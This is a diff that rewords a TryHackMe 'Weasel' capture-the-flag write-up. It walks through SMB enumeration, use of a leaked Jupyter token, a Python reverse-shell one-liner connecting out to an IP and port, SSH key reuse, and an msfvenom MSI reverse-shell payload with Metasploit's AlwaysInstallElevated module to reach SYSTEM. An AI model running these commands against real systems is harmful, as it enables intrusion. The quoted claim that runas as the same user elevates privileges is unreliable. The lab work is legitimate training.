@@ -3,7 +3,7 @@
 
 ## Enumeration:
 
-I started with the quick rustscan to scan for the open ports & services on the target. I found 15 open ports on the host:
+I began the enumeration process by conducting a quick rustscan to scan for open ports and services on the target host. The scan revealed 15 open ports:
 
 ```bash
 sudo rustscan -a 10.10.165.102  -- -sC -sV -vv -oN weasel_nmap
@@ -101,90 +101,89 @@ Host script results:
 |_  start_date: N/A
 ```
 
-Few observables from the port scan results:
+From the port scan results, I made several observations:
 
 ```
-- SMBv2 is enables but message signing is not enforceed.
-- RDP is enbale on port 3389 & target name is: DEV-DATASCI-JUP
-- port 5985 is open which powershell remoting is enabled.
-- port 8888 is open & running TornadoServer/6.0.3 which is hosting Jupyter notebook.
+- SMBv2 is enabled, but message signing is not enforced.
+- RDP is enabled on port 3389, and the target name is set as "DEV-DATASCI-JUP".
+- Port 5985 is open, indicating that PowerShell remoting is enabled.
+- Port 8888 is open and running TornadoServer/6.0.3, which is hosting Jupyter notebook.
 ```
 
-### SMB enumeration:
+### SMB Enumeration:
 
-Since the SMB is enabled, I started enumerating the network shares which is available for me. I used SMBmap to list all shares:
+With SMB enabled, I proceeded to enumerate the network shares available to me. I utilized SMBmap to list all the shares:
 
 ```bash
 smbmap -H weasel.thm -u RandomUser
 ```
-I observed that I have Read & Write access to "datasci-team" share & Read access to IPC$ share.
+I discovered that I had both Read and Write access to the "datasci-team" share, as well as Read access to the IPC$ share.
 
 ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/0b11cea9-cf6e-48e2-b30b-1925210a35f8)
 
-When checked for "datasci-team" share, I observed multiple files present in it, which I listed using smbmap:
-
+Further exploring the "datasci-team" share, I found multiple files present within it. To list these files, I used smbmap:
 ```bash
 smbmap -R datasci-team -H weasel.thm -u DoesNotExist
 ```
 ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/dd41e754-5ae5-4ddb-89cc-4848a4a26759)
 
-I downloaded all those files in my local system after connecting via Smbclient:
+Using Smbclient, I established a connection and downloaded all the files to my local system:
 
 ```bash
 smbclient \\\\weasel.thm\\datasci-team -U "DoesNotExist"
 
 smb: \> prompt off #to turn off warnings
-smb: \> recurse on #to turn on recursive mode
-smb: \> mget * #to download everything from current file path.
+smb: \> recurse on #to enable recursive mode
+smb: \> mget * # to download all files from the current file path
 ```
 ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/37532ed1-c2f3-48cb-a847-54743fdcfe28)
 
-After downloading all the files, I went through them & found a Jupyter-token inside one of the file.
+After downloading all the files, I thoroughly examined them and came across a Jupyter-token inside one of the files.
 
 ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/2af6f790-3a09-4a3f-926d-f87e2cd0ef65)
 
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-## Initial access:
+## Initial Access:
 
-From the port scan results I was already aware that port 8888 is running the tornado server & hosting Jupyter notebook in it, so I went to the server & found an option to login using jupyter token:
+Based on the port scan results, I knew that port 8888 was running a Tornado server hosting a Jupyter notebook. I accessed the server and discovered an option to log in using a Jupyter token:
 
 ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/b5e2db75-db1b-4584-ac65-29562b8e43ee)
 
-I used the Jupyer token which I found during my SMB scan to login into the server & I logged in successfully:
+Using the Jupyter token obtained during the SMB scan, I successfully logged into the server:
 ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/485629a3-b49a-4645-b962-2500e3af6e86)
 
-After logging in I found the same files which I observed when I enumerated through the "**datasci-team**" share. Then I opened of of the Machine learning file "weasel.ipynb" & went through it's content:
+Upon logging in, I found the same files that I had observed in the "**datasci-team**" share. I opened the "weasel.ipynb" file, which was a Machine Learning file, and examined its contents:
 
 ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/316183bd-3700-45f2-b293-3780eebd377b)
 
-I found that there are modules running inside the file & we can also our own module which will be executed by Python, so I used one of the Python reverse shell one-liner & added to the file.
-
+I discovered that the file executed Python modules and allowed for the inclusion of custom modules. Taking advantage of this, I added a Python reverse shell one-liner to the file:
 ```python3
 import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")
 ```
 
-After running the above code I quickly got the shell back to my netcat listener as a "dev-datasci" user.(pwn3d!🙂)
+After running the code, I quickly received a shell back to my netcat listener as the "dev-datasci" user. (pwn3d!🙂)
+
 ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/b034c290-d9a1-4403-a173-c1b317f3abcc)
 
-### User access:
+### User Access:
 
-When I got the initial access as the "dev-datasci" user I searched for other user inside the machine but didn't found any of the user, I checked for the running processes & found very few processes running. 
-I thought may be I am in a docker container but when I check further I found that I am inside a Windows machine & running inside windows subsystem for Linux (WSL):
+After gaining initial access as the "dev-datasci" user, I searched for other users within the machine but did not find any. I examined the running processes and noticed there were very few. Initially, I suspected that I might be inside a Docker container, but upon further investigation, I discovered that I was actually inside a Windows machine running within the Windows Subsystem for Linux (WSL):
 
 ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/4a4b80e1-7c6e-4bfb-a4d2-15a86ea02bd4)
 ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/49e57493-30ca-45a7-adb0-c5d9467ef58f)
 
-I then checked the home directory of the user as part of manual enumeration & found a file "dev-datasci-lowpriv_id_ed25519", which contains the private SSH key.
+During manual enumeration, I checked the home directory of the user and discovered a file named "dev-datasci-lowpriv_id_ed25519," which contained the private SSH key:
+
 ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/3880ef50-322a-4a68-89ad-904361f04f73)
 
-I copied the key in my local machine with the file name id_rsa, modified the permissions to "chmod 600" to use it in the SSH logon & then performed the SSH logon using the user: "dev-datasci-lowpriv".
+I copied the key to my local machine, renamed it as "id_rsa," modified the permissions to "chmod 600" in order to use it for SSH login, and then performed the SSH login using the user "dev-datasci-lowpriv":
 
 ```bash
 ssh -i id_rsa dev-datasci-lowpriv@weasel.thm
 ```
 
-I logged in successfully & got the cmd prompt as user "dev-datasci-lowpriv". (pwn3d!🙂)
+I successfully logged in and obtained a command prompt as the user "dev-datasci-lowpriv." (pwn3d!🙂)
 
 ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/6b6ec7de-688f-4492-9774-211d025a1913)
 
@@ -192,52 +191,50 @@ I logged in successfully & got the cmd prompt as user "dev-datasci-lowpriv". (pw
 
 ## Privilege Escalation:
 
-After gaining access to the low privilege user & getting user flag, I started seraching for the privilege esclation vectors.
-I executed WinPeas to check for the all possible privilege escalation vectors & observed some juicy results in "AlwaysInstallElevated" privilege. I found that AlwaysInstallElevated is set to '1' in both HKLM & HKCU.
+After gaining access to the low privilege user and retrieving the user flag, I began searching for potential privilege escalation vectors. I executed WinPEAS to check for all possible vectors and discovered some interesting results related to the "AlwaysInstallElevated" privilege. I found that "AlwaysInstallElevated" was set to '1' in both HKLM (HKEY_LOCAL_MACHINE) and HKCU (HKEY_CURRENT_USER) registries.
 
 ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/1847e73d-72f2-4c3c-9eb2-be7bc8ce9f30)
 
-When checked on [hacktrickz website](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated) how to exploit this vulnerability to perform Privesc, I found that user with any privilege can install ".msi" files with SYSTEM privilege.
+Upon further research on the [hacktrickz website](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated) regarding how to exploit this vulnerability for privilege escalation, I discovered that any user with privileges can install ".msi" files with SYSTEM privileges.
 
-So, I followed the steps & created a .msi file using 'msfvenom'
+Following the provided steps, I created an ".msi" file using 'msfvenom':
 
 ```bash
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=1337 -f msi -o update.msi
 ```
-Uploaded the "update.msi" to the windows system & executed it:
+I uploaded the "update.msi" file to the Windows system and executed it:
 
 ```
 msiexec /quiet /qn /i update.msi
 ```
 
-But for some reason I didn't get the revershell back to my kali machine. I checked further about why my exploit is not working, I found in a blog that:
+However, I did not receive a reverse shell back to my Kali machine for some reason. While investigating why my exploit was not working, I came across a blog that provided some insights:
 
 ```
 When you run msiexec directly in your SSH session, it uses the current user's privileges and permissions to execute the command. If the user account "dev-datasci-lowpriv" does not have sufficient privileges or lacks necessary permissions, it could result in the failure of the msiexec command.
 
 However, when you use runas /user:dev-datasci-lowpriv to execute msiexec, it runs the command under a different process with the specified user's credentials. This effectively elevates the privileges of the command, potentially bypassing any restrictions or permission issues associated with the current user account.
 ```
-So, I can execute the "msiexec" using the runas command but I don't have the current user credentials. 
+So, I can execute "msiexec" using the "runas" command, but I do not have the current user's credentials.
 
 ### Metasploit:
 
-Then used Metasploit to escalate my privileges. So, intially I created a session using metasploit & then migrated myself into the other higher privilege process.
+Next, I utilized Metasploit to escalate my privileges. Firstly, I created a session using Metasploit and then migrated myself to another process with higher privileges.
 
-I migrated myself because when I checked current privilege, I found myself running as a low level user with session 0.
+The reason for migration was that when I checked my current privilege level, I discovered that I was running as a low-level user in session 0.
 ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/58049932-d767-4378-85d6-147329a4d40f)
 
-After migrating myself now, I am having a higher privelege with session 1.
+After successfully migrating, I obtained a higher privilege level in session 1.
 ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/1a1f5905-8429-4bf9-8bf1-9df1105b3a84)
 
-Now, after the having the higher privilege I searched for the module in metasploit to exploit the "AlwaysInstallElevated" vulnerability & I found it as well under:
+With the elevated privileges, I proceeded to search for a suitable module in Metasploit to exploit the "AlwaysInstallElevated" vulnerability. I located the module under:
 
 ```bash
 exploit/windows/local/always_install_elevated
 ```
-
 ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/b6de0588-9ec4-4afc-9a56-4a603493bc12)
 
-I used the module, changed the variables & finally got a session as "NT AUTHORITY\SYSTEM", after which I got root flag as well.(pwn3d!🙂)
+I utilized the module, modified the variables accordingly, and successfully obtained a session as "NT AUTHORITY\SYSTEM," granting me root privileges. Consequently, I was able to retrieve the root flag as well. (pwn3d!🙂)
 
 ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/509626d7-dc80-4d2b-b7e3-c2a073ef8526)
 
